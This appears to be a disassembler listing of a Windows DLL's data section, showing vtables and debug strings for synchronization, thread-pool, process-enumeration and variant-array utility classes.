		dd offset Ordinal1252
		dd offset Ordinal1253
		dd offset Ordinal1254
off_6AF5F4C0	dd offset sub_6AF4C82A	; DATA XREF: Ordinal1256+Ao
					; Ordinal1255+13o ...
off_6AF5F4C4	dd offset sub_6AF4C84C	; DATA XREF: Ordinal1262+Ao
					; Ordinal1261+13o ...
off_6AF5F4C8	dd offset unknown_libname_9 ; DATA XREF: Ordinal1267+Do
					; Ordinal1268o	...
					; Microsoft VisualC 2-10/net runtime
off_6AF5F4CC	dd offset sub_6AF4C808	; DATA XREF: Ordinal1235+Bo
					; Ordinal1236o	...
; char aCmessagelock_0[]
aCmessagelock_0	db 'CMessageLock::LockWithMessagePump() : nCount == 0 && bExit == FAL'
					; DATA XREF: Ordinal1272+102o
		db 'SE',0Ah,0
		align 4
; char aCmessagelockLo[]
aCmessagelockLo	db 'CMessageLock::LockWithMessagePump() : msg.message == WM_QUIT && b'
					; DATA XREF: Ordinal1272+94o
		db 'ExitOnQuit == FALSE',0Ah,0
		align 10h
off_6AF5F570	dd offset unknown_libname_10 ; DATA XREF: Ordinal1275+2o
					; Ordinal1276o	...
					; Microsoft VisualC 2-10/net runtime
		dd offset _purecall
		dd offset _purecall
		dd offset _purecall
; char aGlobal[]
aGlobal		db 'Global\',0          ; DATA XREF: Ordinal1277+2Co
; char aCsyncobjectCre[]
aCsyncobjectCre	db 'CSyncObject::CreateGlobalName() : lstrlen(szName) + 7 + 1 > dwCha'
					; DATA XREF: Ordinal1277+14o
		db 'rCount',0Ah,0
		align 4
; char aCcriticalsec_2[]
aCcriticalsec_2	db 'CCriticalSection::Lock() : __except(), 0x%08X',0Ah,0
					; DATA XREF: Ordinal1284+4Ao
		align 4
; char aCcriticalsecti[]
aCcriticalsecti	db 'CCriticalSection::Lock() : m_bCreated == FALSE',0Ah,0
					; DATA XREF: Ordinal1284+12o
		align 8
stru_6AF5F638	_SCOPETABLE_ENTRY <0FFFFFFFFh, offset loc_6AF4CAD6, \
					; DATA XREF: Ordinal1284+2o
				   offset loc_6AF4CAE4>	; SEH scope table for function 6AF4CAA0
; char aCcriticalsec_0[]
aCcriticalsec_0	db 'CCriticalSection::TryLock() : m_bCreated == FALSE',0Ah,0
					; DATA XREF: Ordinal1285+6o
		align 4
; char aCcriticalsec_1[]
aCcriticalsec_1	db 'CCriticalSection::UnLock() : m_bCreated == FALSE',0Ah,0
					; DATA XREF: Ordinal1288+6o
		align 4
off_6AF5F6AC	dd offset sub_6AF4D1CA	; DATA XREF: Ordinal1290+6o
					; Ordinal1292+3o ...
		dd offset Ordinal1299
		dd offset Ordinal1300
		dd offset Ordinal1118
; char aCsemaphoreUnlo[]
aCsemaphoreUnlo	db 'CSemaphore::Unlock() : m_hSemaphore == NULL',0Ah,0
					; DATA XREF: Ordinal1297+7o
		align 4
; char aCsemaphoreLock[]
aCsemaphoreLock	db 'CSemaphore::Lock() : m_hSemaphore == NULL',0Ah,0
					; DATA XREF: Ordinal1299+Fo
		align 4
off_6AF5F718	dd offset sub_6AF4D211	; DATA XREF: Ordinal1302+6o
					; Ordinal1304+3o ...
		dd offset Ordinal1310
		dd offset Ordinal1311
		dd offset Ordinal1118
; char aCmutexLockM_hm[]
aCmutexLockM_hm	db 'CMutex::Lock() : m_hMutex == NULL',0Ah,0 ; DATA XREF: Ordinal1310+Fo
					; Ordinal1311+7o
		align 4
off_6AF5F74C	dd offset sub_6AF4D255	; DATA XREF: Ordinal1313+6o
					; Ordinal1315+3o ...
		dd offset Ordinal1326
		dd offset Ordinal1058
		dd offset Ordinal1118
; char aCeventSetevent[]
aCeventSetevent	db 'CEvent::SetEvent() : m_hEvent == NULL',0Ah,0 ; DATA XREF: Ordinal1322+7o
		align 4
; char aCeventPulseeve[]
aCeventPulseeve	db 'CEvent::PulseEvent() : m_hEvent == NULL',0Ah,0
					; DATA XREF: Ordinal1323+7o
		align 10h
; char aCeventReseteve[]
aCeventReseteve	db 'CEvent::ResetEvent() : m_hEvent == NULL',0Ah,0
					; DATA XREF: Ordinal1324+7o
		align 4
; char aCeventLockM_he[]
aCeventLockM_he	db 'CEvent::Lock() : m_hEvent == NULL',0Ah,0 ; DATA XREF: Ordinal1326+Fo
		align 10h
off_6AF5F800	dd offset sub_6AF4D1AE	; DATA XREF: Ordinal1279+3o
					; Ordinal1278+Fo
		dd offset Ordinal1287
		dd offset Ordinal1288
		dd offset Ordinal1091
; char aCcriticalsec_3[]
aCcriticalsec_3	db 'CCriticalSection::Create() : __except(), 0x%08X',0Ah,0
					; DATA XREF: Ordinal1282+45o
		align 8
stru_6AF5F848	_SCOPETABLE_ENTRY <0FFFFFFFFh, offset loc_6AF4CDA7, \
					; DATA XREF: Ordinal1282+2o
				   offset loc_6AF4CDB5>	; SEH scope table for function 6AF4CD76
; char aCsemaphoreCrea[]
aCsemaphoreCrea	db 'CSemaphore::Create() : CreateSemaphore() == NULL, 0x%08X',0Ah,0
					; DATA XREF: Ordinal1294+6Bo
		align 10h
; char aSCreateCreateg[]
aSCreateCreateg	db '%s::Create() : CreateGlobalName() == FALSE',0Ah,0
					; DATA XREF: Ordinal1294+40o
					; Ordinal1295+41o ...
aCsemaphore	db 'CSemaphore',0       ; DATA XREF: Ordinal1294+3Bo
					; Ordinal1295+3Co
		align 4
; char aCsemaphoreOpen[]
aCsemaphoreOpen	db 'CSemaphore::Open() : OpenSemaphore() == NULL, %s, 0x%08X',0Ah,0
					; DATA XREF: Ordinal1295+71o
		align 4
; char aCmutexCreateCr[]
aCmutexCreateCr	db 'CMutex::Create() : CreateMutex() == NULL, 0x%08X',0Ah,0
					; DATA XREF: Ordinal1306+68o
		align 4
aCmutex		db 'CMutex',0           ; DATA XREF: Ordinal1306+3Bo
					; Ordinal1307+3Co
		align 10h
; char aCmutexOpenOpen[]
aCmutexOpenOpen	db 'CMutex::Open() : OpenMutex() == NULL, %s, 0x%08X',0Ah,0
					; DATA XREF: Ordinal1307+71o
		align 4
; char aCeventCreateCr[]
aCeventCreateCr	db 'CEvent::Create() : CreateEvent() == NULL, 0x%08X',0Ah,0
					; DATA XREF: Ordinal1317+6Bo
		align 4
aCevent		db 'CEvent',0           ; DATA XREF: Ordinal1317+3Bo
					; Ordinal1318+3Co
		align 10h
; char aCeventOpenOpen[]
aCeventOpenOpen	db 'CEvent::Open() : OpenEvent() == NULL, %s, 0x%08X',0Ah,0
					; DATA XREF: Ordinal1318+71o
		align 4
off_6AF5F9E4	dd offset unknown_libname_11 ; DATA XREF: Ordinal1329+12o
					; Ordinal1330o	...
					; Microsoft VisualC 2-10/net runtime
; char aCntqueryinfo_1[]
aCntqueryinfo_1	db 'CNtQueryInformationProcess::GetParentProcessId() : IsModule() == '
					; DATA XREF: Ordinal1341:loc_6AF4D388o
		db 'FALSE',0Ah,0
; char aCntqueryinfo_0[]
aCntqueryinfo_0	db 'CNtQueryInformationProcess::GetParentProcessId() : NtQueryInforma'
					; DATA XREF: Ordinal1341+73o
		db 'tionProcess() != STATUS_SUCCESS, %lu, 0x%08X',0Ah,0
		align 10h
; char aCntqueryinform[]
aCntqueryinform	db 'CNtQueryInformationProcess::GetParentProcessId() : OpenProcess() '
					; DATA XREF: Ordinal1341+3Fo
		db '== NULL, %lu, 0x%08X',0Ah,0
		align 4
; char aNtqueryinforma[]
aNtqueryinforma	db 'NtQueryInformationProcess',0 ; DATA XREF: Ordinal1345:loc_6AF4D3C0o
					; Ordinal1342+22o ...
		align 4
off_6AF5FB14	dd offset sub_6AF4D836	; DATA XREF: Ordinal1337+Co
					; Ordinal1338+7o
; char aNtdll_dll[]
aNtdll_dll	db 'NTDLL.DLL',0        ; DATA XREF: Ordinal1339+Co
		align 4
off_6AF5FB24	dd offset sub_6AF4D852	; DATA XREF: Ordinal1346+6o
					; Ordinal1347+3o
; char aCsysteminfoCre[]
aCsysteminfoCre	db 'CSystemInfo::Create() : m_bToolHelpOk == FALSE && m_bPSAPIOk == F'
					; DATA XREF: Ordinal1348+42o
		db 'ALSE',0Ah,0
		align 10h
off_6AF5FB70	dd offset sub_6AF4DE9D	; DATA XREF: Ordinal1333+Do
					; Ordinal1334o	...
		align 8
; char aCsysteminfoG_3[]
aCsysteminfoG_3	db 'CSystemInfo::GetModuleListPSAPI() : m_PSAPI.EnumProcessModules =='
					; DATA XREF: Ordinal1353:loc_6AF4E2FBo
		db ' NULL',0Ah,0
; char aCsysteminfoG_2[]
aCsysteminfoG_2	db 'CSystemInfo::GetModuleListPSAPI() : m_PSAPI.GetModuleFileNameEx()'
					; DATA XREF: Ordinal1353+2AEo
		db ' == FALSE, 0x%08X',0Ah,0
aCsysteminfoG_1	db 'CSystemInfo::GetProcessInfoPSAPI()',0 ; DATA XREF: Ordinal1353+244o
		align 4
; char aCsysteminfoG_0[]
aCsysteminfoG_0	db 'CSystemInfo::GetModuleListPSAPI() : m_PSAPI.EnumProcessModules() '
					; DATA XREF: Ordinal1353+1FCo
		db '== FALSE, 0x%08X',0Ah,0
		align 4
aCsysteminfoGet	db 'CSystemInfo::GetModuleListPSAPI()',0 ; DATA XREF: Ordinal1353+5Eo
		align 10h
; char aCsysteminfoG_8[]
aCsysteminfoG_8	db 'CSystemInfo::GetModuleListToolHelp() : m_ToolHelp.CreateToolhelp3'
					; DATA XREF: Ordinal1356:loc_6AF4E625o
		db '2Snapshot == NULL',0Ah,0
		align 8
; char aCsysteminfoG_7[]
aCsysteminfoG_7	db 'CSystemInfo::GetModuleListToolHelp() : m_ToolHelp.Module32Next() '
					; DATA XREF: Ordinal1356+2DAo
		db '== FALSE, %lu, 0x%08X',0Ah,0
aCsysteminfoG_6	db 'CSystemInfo::GetModuleListToolHelp()',0 ; DATA XREF: Ordinal1356+183o
		align 4
; char aCsysteminfoG_5[]
aCsysteminfoG_5	db 'CSystemInfo::GetModuleListToolHelp() : m_ToolHelp.Module32First()'
					; DATA XREF: Ordinal1356+BDo
		db ' == FALSE, %lu, 0x%08X',0Ah,0
		align 8
; char aCsysteminfoG_4[]
aCsysteminfoG_4	db 'CSystemInfo::GetModuleListToolHelp() : m_ToolHelp.CreateToolhelp3'
					; DATA XREF: Ordinal1356+6Do
		db '2Snapshot() == INVALID_HANDLE_VALUE, %lu, 0x%08X',0Ah,0
		align 10h
; char aCsysteminfo_11[]
aCsysteminfo_11	db 'CSystemInfo::GetProcessInfoPSAPI() : GetModuleListPSAPI() == FALS'
					; DATA XREF: Ordinal1352+84o
		db 'E, %lu',0Ah,0
		align 10h
; char aCsysteminfo_10[]
aCsysteminfo_10	db 'CSystemInfo::GetProcessInfoPSAPI() : OpenProcess() == NULL, %lu, '
					; DATA XREF: Ordinal1352+52o
		db '0x%08X',0Ah,0
		align 10h
; char aCsysteminfoG_9[]
aCsysteminfoG_9	db 'CSystemInfo::GetProcessInfoPSAPI() : m_NtQueryInformationProcess.'
					; DATA XREF: Ordinal1352+26o
		db 'GetParentProcessId() == FALSE, %lu',0Ah,0
		align 4
; char aCsysteminfo_15[]
aCsysteminfo_15	db 'CSystemInfo::GetProcessListPSAPI() : GetProcessInfoPSAPI() == FAL'
					; DATA XREF: Ordinal1354+2CAo
		db 'SE',0Ah,0
		align 10h
; char aCsysteminfo_14[]
aCsysteminfo_14	db 'CSystemInfo::GetProcessListPSAPI() : m_PSAPI.EnumProcesses() == F'
					; DATA XREF: Ordinal1354+207o
		db 'ALSE, 0x%08X',0Ah,0
		align 10h
aCsysteminfo_13	db 'CSystemInfo::GetProcessListPSAPI()',0 ; DATA XREF: Ordinal1354+70o
					; Ordinal1354+263o
		align 8
; char aCsysteminfo_12[]
aCsysteminfo_12	db 'CSystemInfo::GetProcessListPSAPI() : m_PSAPI.EnumProcesses == NUL'
					; DATA XREF: Ordinal1354+2Bo
		db 'L',0Ah,0
		align 10h
; char aCsysteminfo_22[]
aCsysteminfo_22	db 'CSystemInfo::GetProcessListToolHelp() : m_ToolHelp.CreateToolhelp'
					; DATA XREF: Ordinal1357:loc_6AF4F2A6o
		db '32Snapshot == NULL',0Ah,0
		align 4
; char aCsysteminfo_21[]
aCsysteminfo_21	db 'CSystemInfo::GetProcessListToolHelp() : bFound == FALSE, %lu',0Ah,0
					; DATA XREF: Ordinal1357+2BDo
		align 4
; char aCsysteminfo_20[]
aCsysteminfo_20	db 'CSystemInfo::GetProcessListToolHelp() : m_ToolHelp.Process32Next('
					; DATA XREF: Ordinal1357+1CDo
		db ') == FALSE, %lu, 0x%08X',0Ah,0
		align 8
; char aCsysteminfo_19[]
aCsysteminfo_19	db 'CSystemInfo::GetProcessListToolHelp() : GetModuleListToolHelp() ='
					; DATA XREF: Ordinal1357+16Do
		db '= FALSE, %lu',0Ah,0
		align 4
aCsysteminfo_18	db 'CSystemInfo::GetProcessListToolHelp()',0
					; DATA XREF: Ordinal1357:loc_6AF4F087o
		align 10h
; char aCsysteminfo_17[]
aCsysteminfo_17	db 'CSystemInfo::GetProcessListToolHelp() : m_ToolHelp.Process32First'
					; DATA XREF: Ordinal1357+B1o
		db '() == FALSE, %lu, 0x%08X',0Ah,0
		align 10h
; char aCsysteminfo_16[]
aCsysteminfo_16	db 'CSystemInfo::GetProcessListToolHelp() : m_ToolHelp.CreateToolhelp'
					; DATA XREF: Ordinal1357+62o
		db '32Snapshot() == INVALID_HANDLE_VALUE, %lu, 0x%08X',0Ah,0
		align 8
; char aCsysteminfo_25[]
aCsysteminfo_25	db 'CSystemInfo::GetProcessList() : m_bPSAPIOk == FALSE && m_bToolHel'
					; DATA XREF: Ordinal1351:loc_6AF4F338o
		db 'pOk == FALSE',0Ah,0
		align 4
aCsysteminfo_24	db 'CSystemInfo::GetProcessList() : GetProcessListToolHelp() == FALSE'
					; DATA XREF: Ordinal1351+65o
		db 0Ah,0
		align 10h
; char aCsysteminfo_23[]
aCsysteminfo_23	db 'CSystemInfo::GetProcessList() : GetProcessListPSAPI() == FALSE',0Ah,0
					; DATA XREF: Ordinal1351+2Bo
; char aCsysteminfo_26[]
aCsysteminfo_26	db 'CSystemInfo::GetProcessInfoToolHelp() : GetProcessListToolHelp() '
					; DATA XREF: Ordinal1355+25o
		db '== FALSE, %lu',0Ah,0
; char aCsysteminfo_29[]
aCsysteminfo_29	db 'CSystemInfo::GetProcessInfo() : m_bPSAPIOk == FALSE && m_bToolHel'
					; DATA XREF: Ordinal1350:loc_6AF4F3F3o
		db 'pOk == FALSE',0Ah,0
		align 10h
aCsysteminfo_28	db 'CSystemInfo::GetProcessInfo() : GetProcessInfoToolHelp() == FALSE'
					; DATA XREF: Ordinal1350+50o
		db 0Ah,0
		align 8
; char aCsysteminfo_27[]
aCsysteminfo_27	db 'CSystemInfo::GetProcessInfo() : GetProcessInfoPSAPI() == FALSE',0Ah,0
					; DATA XREF: Ordinal1350+1Fo
off_6AF604B8	dd offset unknown_libname_12 ; DATA XREF: Ordinal1358+2o
					; Ordinal1359o	...
					; Microsoft VisualC 2-10/net runtime
		dd offset _purecall
aListTTooLong	db 'list<T> too long',0 ; DATA XREF: sub_6AF4F557+20o
		align 4
off_6AF604D4	dd offset sub_6AF4F863	; DATA XREF: Ordinal1360+6o
					; Ordinal1361+6o
		dd offset Ordinal1362
		dd offset _purecall
		dd offset Ordinal1366
		dd offset Ordinal1367
aCtaskschedul_0	db 'CTaskScheduler::Add()',0 ; DATA XREF: Ordinal1362:loc_6AF4F6F5o
		align 10h
; char aCtaskscheduler[]
aCtaskscheduler	db 'CTaskScheduler::Add() : m_TaskInfoList.size() >= m_nMaxQueueLengt'
					; DATA XREF: Ordinal1362+61o
		db 'h',0Ah,0
off_6AF60544	dd offset sub_6AF4F9C9	; DATA XREF: Ordinal1368+1Co
					; Ordinal1369+10o
		dd offset Ordinal1371
		dd offset Ordinal1372
		dd offset Ordinal1366
		dd offset Ordinal1367
off_6AF60558	dd offset loc_6AF4F9D1	; DATA XREF: Ordinal1368+16o
					; Ordinal1369+Ao
		dd offset Ordinal1388
		dd offset Ordinal1389
		dd offset Ordinal1373
		dd offset Ordinal1374
		dd offset Ordinal1375
; char aCtaskthreadCre[]
aCtaskthreadCre	db 'CTaskThread::Create() : m_AddEvent.Create() == FALSE',0Ah,0
					; DATA XREF: Ordinal1370+22o
		align 4
; char aCworkerthreadI[]
aCworkerthreadI	db 'CWorkerThread::InitInstance()',0Ah,0 ; DATA XREF: Ordinal1374o
		align 4
; char aCworkerthreadE[]
aCworkerthreadE	db 'CWorkerThread::ExitInstance()',0Ah,0 ; DATA XREF: Ordinal1375o
		align 4
; char aCtaskthreadRun[]
aCtaskthreadRun	db 'CTaskThread::Run()',0Ah,0 ; DATA XREF: Ordinal1373+7o
off_6AF605FC	dd offset unknown_libname_13 ; DATA XREF: Ordinal1377+4o
					; Ordinal1379o	...
					; Microsoft VisualC 2-10/net runtime
off_6AF60600	dd offset sub_6AF4FF22	; DATA XREF: Ordinal1381+8o
					; Ordinal1382+7o
		dd offset Ordinal1388
		dd offset Ordinal1389
		dd offset _purecall
		dd offset Ordinal1397
		dd offset Ordinal1398
; char aCthreadInitins[]
aCthreadInitins	db 'CThread::InitInstance()',0Ah,0 ; DATA XREF: Ordinal1397o
		align 4
; char aCthreadExitins[]
aCthreadExitins	db 'CThread::ExitInstance()',0Ah,0 ; DATA XREF: Ordinal1398o
		align 10h
; char aCthreadStartIn[]
aCthreadStartIn	db 'CThread::Start() : InitInstance() == FALSE',0Ah,0
					; DATA XREF: Ordinal1399+5Co
		align 10h
; char aCthreadStartCc[]
aCthreadStartCc	db 'CThread::Start() : CCoInitialize::CoInitialize() != S_OK, 0x%08X',0Ah
					; DATA XREF: Ordinal1399+17o
		db 0
		align 4
; char aCthreadCreat_0[]
aCthreadCreat_0	db 'CThread::Create() : m_bInitInstanceResult == FALSE',0Ah,0
					; DATA XREF: Ordinal1383+12Eo
; char aCthreadCreate_[]
aCthreadCreate_	db 'CThread::Create() : _beginthreadex() == NULL, 0x%08X',0Ah,0
					; DATA XREF: Ordinal1383+EEo
		align 10h
aCthreadCreateC	db 'CThread::Create() : CreateThread() == NULL, 0x%08X',0Ah,0
					; DATA XREF: Ordinal1383+B0o
; char aCthreadCreateM[]
aCthreadCreateM	db 'CThread::Create() : m_InitInstanceEvent.Create() == FALSE',0Ah,0
					; DATA XREF: Ordinal1383+67o
		align 10h
; char aCthreadCreateI[]
aCthreadCreateI	db 'CThread::Create() : IsThread() != FALSE',0Ah,0
					; DATA XREF: Ordinal1383+10o
		align 4
; char aCthreadTermina[]
aCthreadTermina	db 'CThread::Terminate() : WaitForExit(%lu) == FALSE, 0x%04X',0Ah,0
					; DATA XREF: Ordinal1388+56o
		align 4
off_6AF60808	dd offset sub_6AF50288	; DATA XREF: Ordinal1400+13o
					; Ordinal1401o
		dd offset Ordinal1388
		dd offset Ordinal1389
		dd offset Ordinal1404
		dd offset Ordinal1374
		dd offset Ordinal1375
		dd offset Ordinal1402
aCthreadpoolAll	db 'CThreadPool::AllocateThread()',0 ; DATA XREF: Ordinal1418+1Do
		align 4
; char aCworkerthreadR[]
aCworkerthreadR	db 'CWorkerThread::Run()',0Ah,0 ; DATA XREF: Ordinal1404+7o
		align 4
off_6AF6085C	dd offset sub_6AF50853	; DATA XREF: Ordinal1408+9o
					; Ordinal1409+5o
		dd offset Ordinal1419
		dd offset Ordinal1420
		dd offset Ordinal1366
		dd offset Ordinal1367
		dd offset Ordinal1418
		dd offset Ordinal1421
; char aCthreadpoolDes[]
aCthreadpoolDes	db 'CThreadPool::Destroy() : (*pos)->Terminate() == FALSE',0Ah,0
					; DATA XREF: Ordinal1412+36o
		align 10h
aCthreadpoolC_1	db 'CThreadPool::CreateThread()',0 ; DATA XREF: Ordinal1422+9Co
; char aCthreadpoolC_0[]
aCthreadpoolC_0	db 'CThreadPool::CreateThread() : pThread->Create() == FALSE',0Ah,0
					; DATA XREF: Ordinal1422+7Eo
		align 4
aCthreadpoolCre	db 'CThreadPool::CreateThread() : AllocateThread() == NULL',0Ah,0
					; DATA XREF: Ordinal1422+5Ao
; char aCthreadpoolC_5[]
aCthreadpoolC_5	db 'CThreadPool::Create() : CreateThread() == FALSE',0Ah,0
					; DATA XREF: Ordinal1410:loc_6AF50935o
		align 4
; char aCthreadpoolC_4[]
aCthreadpoolC_4	db 'CThreadPool::Create() : m_AddEvent.Create() == FALSE',0Ah,0
					; DATA XREF: Ordinal1410+69o
		align 4
; char aCthreadpoolC_3[]
aCthreadpoolC_3	db 'CThreadPool::Create() : IsThreadPool() != FALSE',0Ah,0
					; DATA XREF: Ordinal1410+3Do
		align 10h
; char aCthreadpoolC_2[]
aCthreadpoolC_2	db 'CThreadPool::Create() : dwThreadCount == 0',0Ah,0
					; DATA XREF: Ordinal1410+11o
; char aCthreadpoolS_0[]
aCthreadpoolS_0	db 'CThreadPool::SetThreadCount() : CreateThread() == FALSE',0Ah,0
					; DATA XREF: Ordinal1416:loc_6AF509C8o
		align 4
; char aCthreadpoolSet[]
aCthreadpoolSet	db 'CThreadPool::SetThreadCount() : dwThreadCount == 0',0Ah,0
					; DATA XREF: Ordinal1416+11o
; char aProcess32next[]
aProcess32next	db 'Process32Next',0    ; DATA XREF: Ordinal1428:loc_6AF50BA6o
					; Ordinal1425:loc_6AF50CEBo ...
		align 4
; char aProcess32first[]
aProcess32first	db 'Process32First',0   ; DATA XREF: Ordinal1428:loc_6AF50B91o
					; Ordinal1425:loc_6AF50CD6o ...
		align 4
; char aModule32next[]
aModule32next	db 'Module32Next',0     ; DATA XREF: Ordinal1428:loc_6AF50B7Co
					; Ordinal1425:loc_6AF50CC1o ...
		align 4
; char aModule32first[]
aModule32first	db 'Module32First',0    ; DATA XREF: Ordinal1428:loc_6AF50B67o
					; Ordinal1425:loc_6AF50CACo ...
		align 4
; char aToolhelp32read[]
aToolhelp32read	db 'Toolhelp32ReadProcessMemory',0 ; DATA XREF: Ordinal1428:loc_6AF50B52o
					; Ordinal1425:loc_6AF50C97o ...
; char aThread32next[]
aThread32next	db 'Thread32Next',0     ; DATA XREF: Ordinal1428:loc_6AF50B3Do
					; Ordinal1425:loc_6AF50C82o ...
		align 4
; char aThread32first[]
aThread32first	db 'Thread32First',0    ; DATA XREF: Ordinal1428:loc_6AF50B28o
					; Ordinal1425:loc_6AF50C6Do ...
		align 4
; char aHeap32next[]
aHeap32next	db 'Heap32Next',0       ; DATA XREF: Ordinal1428:loc_6AF50B13o
					; Ordinal1425:loc_6AF50C58o ...
		align 4
; char aHeap32listnext[]
aHeap32listnext	db 'Heap32ListNext',0   ; DATA XREF: Ordinal1428:loc_6AF50AFEo
					; Ordinal1425:loc_6AF50C43o ...
		align 4
; char aHeap32listfirs[]
aHeap32listfirs	db 'Heap32ListFirst',0  ; DATA XREF: Ordinal1428:loc_6AF50AE9o
					; Ordinal1425:loc_6AF50C2Eo ...
; char aHeap32first[]
aHeap32first	db 'Heap32First',0      ; DATA XREF: Ordinal1428:loc_6AF50AD4o
					; Ordinal1425:loc_6AF50C19o ...
; char aCreatetoolhelp[]
aCreatetoolhelp	db 'CreateToolhelp32Snapshot',0 ; DATA XREF: Ordinal1428:loc_6AF50ABFo
					; Ordinal1425+25o ...
		align 4
off_6AF60B4C	dd offset sub_6AF50E77	; DATA XREF: Ordinal1423+Co
					; Ordinal1424+3o
off_6AF60B50	dd offset sub_6AF51073	; DATA XREF: Ordinal1431+22o
					; Ordinal1432+6o
		dd offset Ordinal1463
		dd offset Ordinal1464
		dd offset Ordinal1465
off_6AF60B60	dd offset sub_6AF5106B	; DATA XREF: Ordinal1431+1Bo
					; Ordinal1432+Co
		align 8
; char aCvariantarchiv[]
aCvariantarchiv	db 'CVariantArchive::ReadEx() : CVariantBuffer::GetSize() - m_nDataSi'
					; DATA XREF: Ordinal1463+1Ao
		db 'ze < dwSize',0Ah,0
		align 4
; char aCvariantarch_0[]
aCvariantarch_0	db 'CVariantArchive::SetPosEx() : uPos >= CVariantBuffer::GetSize()',0Ah
					; DATA XREF: Ordinal1465:loc_6AF50FAAo
		db 0
		align 4
; char aCvariantarch_3[]
aCvariantarch_3	db 'CVariantArchive::ReAlloc() : nCurrentSize == nSize',0Ah,0
					; DATA XREF: Ordinal1466+53o
; char aCvariantarch_2[]
aCvariantarch_2	db 'CVariantArchive::ReAlloc() : dwCurrentSize == dwSize',0Ah,0
					; DATA XREF: Ordinal1466+2Co
		align 4
; char aCvariantarch_1[]
aCvariantarch_1	db 'CVariantArchive::ReSize() : dwCurrentSize == 0',0Ah,0
					; DATA XREF: Ordinal1466+18o
; char aCvariantarch_5[]
aCvariantarch_5	db 'CVariantArchive::WriteEx() : ReSize() == FALSE',0Ah,0
					; DATA XREF: Ordinal1464+48o
aCvariantarch_4	db 'CVariantArchive::WriteEx() : Create(dwSize) == FALSE',0Ah,0
					; DATA XREF: Ordinal1464+23o
		align 10h
off_6AF60D00	dd offset sub_6AF5165D	; DATA XREF: Ordinal1467+7o
					; Ordinal1469+7o ...
; char aCvariantarrayG[]
aCvariantarrayG	db 'CVariantArray::GetVariant() : pVariant == NULL',0Ah,0
					; DATA XREF: Ordinal1490+14o
; char aCvariantarra_0[]
aCvariantarra_0	db 'CVariantArray::GetSafeArray() : pVariant == NULL',0Ah,0
					; DATA XREF: Ordinal1491+7o
		align 4
; char aCvariantarrayI[]
aCvariantarrayI	db 'CVariantArray::IsVariantArray() : pVariant == NULL',0Ah,0
					; DATA XREF: Ordinal1492+7o
; char aCvariantarra_1[]
aCvariantarra_1	db 'CVariantArray::GetSize() : pSa == NULL',0Ah,0
					; DATA XREF: Ordinal1494+Do
; char aCvariantarra_2[]
aCvariantarra_2	db 'CVariantArray::SetSize() : IsArray() == FALSE',0Ah,0
					; DATA XREF: Ordinal1495:loc_6AF5126Co
		align 4
; char aCvariantarrayS[]
aCvariantarrayS	db 'CVariantArray::SetSize() : SafeArrayRedim() != S_OK, 0x%08X',0Ah,0
					; DATA XREF: Ordinal1495+4Ao
		align 4
; char aCvariantarra_3[]
aCvariantarra_3	db 'CVariantArray::Copy() : pVariant == NULL',0Ah,0
					; DATA XREF: Ordinal1478:loc_6AF512EFo
		align 10h
; char aCvariantarrayC[]
aCvariantarrayC	db 'CVariantArray::Copy() : VariantCopyInd() != S_OK, 0x%08X',0Ah,0
					; DATA XREF: Ordinal1478+2Do
		align 4
; char aCvariantarrayA[]
aCvariantarrayA	db 'CVariantArray::Attach() : pVariant == NULL',0Ah,0
					; DATA XREF: Ordinal1480:loc_6AF51336o
; char aCvariantarrayD[]
aCvariantarrayD	db 'CVariantArray::Detach() : pVariant == NULL',0Ah,0
					; DATA XREF: Ordinal1481+Co
; char aCvariantarrayR[]
aCvariantarrayR	db 'CVariantArray::Reference() : pVariant == NULL',0Ah,0
					; DATA XREF: Ordinal1482+Co
		align 4
; char aCvariantarra_5[]
aCvariantarra_5	db 'CVariantArray::GetAt() : pValue == NULL',0Ah,0
					; DATA XREF: Ordinal1485:loc_6AF51416o
		align 10h
; char aCvariantarra_4[]
aCvariantarra_4	db 'CVariantArray::GetAt() : SafeArrayGetElement() != S_OK, 0x%08X',0Ah,0
					; DATA XREF: Ordinal1485+4Co
; char aCvariantarra_8[]
aCvariantarra_8	db 'CVariantArray::SetAt() : pVariant == NULL',0Ah,0
					; DATA XREF: Ordinal1486:loc_6AF51493o
		align 10h
; char aCvariantarra_7[]
aCvariantarra_7	db 'CVariantArray::SetAt() : SafeArrayPutElement() != S_OK, 0x%08X',0Ah,0
					; DATA XREF: Ordinal1486+59o
aCvariantarra_6	db 'CVariantArray::SetAt() : SetSize() == FALSE',0Ah,0
					; DATA XREF: Ordinal1486+36o
		align 10h
; char aCvariantarr_10[]
aCvariantarr_10	db 'CVariantArray::GetAt() : IsArray() == FALSE',0Ah,0
					; DATA XREF: Ordinal1487:loc_6AF514FAo
		align 10h
; char aCvariantarra_9[]
aCvariantarra_9	db 'CVariantArray::GetAt() : SafeArrayPtrOfIndex() != S_OK, 0x%08X',0Ah,0
					; DATA XREF: Ordinal1487+43o
; char aCvariantarrayL[]
aCvariantarrayL	db 'CVariantArray::Lock() : SafeArrayLock() != S_OK, 0x%08X',0Ah,0
					; DATA XREF: Ordinal1488+15o
		align 4
; char aCvariantarrayU[]
aCvariantarrayU	db 'CVariantArray::Unlock() : SafeArrayUnlock() != S_OK, 0x%08X',0Ah,0
					; DATA XREF: Ordinal1489+15o
		align 4
; char aCvariantarr_11[]
aCvariantarr_11	db 'CVariantArray::CVariantArray() : Copy() == FALSE',0Ah,0
					; DATA XREF: Ordinal1469+25o
					; Ordinal1468+25o
		align 10h
; char aCvariantarrayO[]
aCvariantarrayO	db 'CVariantArray::operator =() : Copy() == FALSE',0Ah,0
					; DATA XREF: Ordinal1472+16o
					; Ordinal1471+16o
		align 10h
; char aCvariantarr_13[]
aCvariantarr_13	db 'CVariantArray::Create() : SafeArrayCreate() == NULL',0Ah,0
					; DATA XREF: Ordinal1475+37o
		align 4
aCvariantarr_12	db 'CVariantArray::Create() : nSize < 0',0Ah,0 ; DATA XREF: Ordinal1475+10o
		align 10h
off_6AF611E0	dd offset sub_6AF51A7B	; DATA XREF: Ordinal1496+7o
					; Ordinal1499+3o ...
; char aCvariantbuffer[]
aCvariantbuffer	db 'CVariantBuffer::Detach() : pVariant == NULL',0Ah,0
					; DATA XREF: Ordinal1510+Co
		align 4
; char aCvariantbuff_0[]
aCvariantbuff_0	db 'CVariantBuffer::Reference() : pVariant == NULL',0Ah,0
					; DATA XREF: Ordinal1511+Co
; char aCvariantbuff_1[]
aCvariantbuff_1	db 'CVariantBuffer::IsVariantBuffer() : pVariant == NULL',0Ah,0
					; DATA XREF: Ordinal1516+7o
		align 4
; char aCvariantbuff_2[]
aCvariantbuff_2	db 'CVariantBuffer::GetSize() : pSa == NULL',0Ah,0
